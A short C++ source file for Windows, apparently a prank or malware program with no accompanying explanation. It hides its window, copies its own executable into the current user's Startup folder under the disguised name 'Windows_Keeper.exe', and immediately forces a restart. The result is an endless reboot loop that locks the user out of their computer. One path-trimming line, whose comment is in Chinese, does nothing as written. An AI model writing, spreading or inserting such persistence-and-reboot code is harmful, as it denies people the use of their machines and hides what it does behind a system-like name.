#include <iostream>
#include <windows.h>

using namespace std;

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
int main()
{   
    //Get Windows UserName
    TCHAR name[60];
    DWORD size = sizeof(name) / sizeof(name[0]);
    GetUserName(name, &size);
  
    //Convert LPWSTR to string
    wstring ws(name);
    string s = string(ws.begin(), ws.end());

    //Get file path
    char szFilePath[MAX_PATH + 1] = { 0 };
    GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
    (strrchr(szFilePath, '\\'))[0]; // 刪除檔名，只獲得路徑字串
    string Bp = szFilePath;
    string Cp = "C:/Users/" + s + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows_Keeper.exe";
    
    //Convert string to LPCWSTR 
    wstring stemp = wstring(Bp.begin(), Bp.end());
    LPCWSTR LBp = stemp.c_str();
    wstring stemp2 = wstring(Cp.begin(), Cp.end());
    LPCWSTR LCp = stemp2.c_str();

    CopyFile(LBp, LCp, FALSE);

    system("shutdown -r -t 0");

    return 0;
}




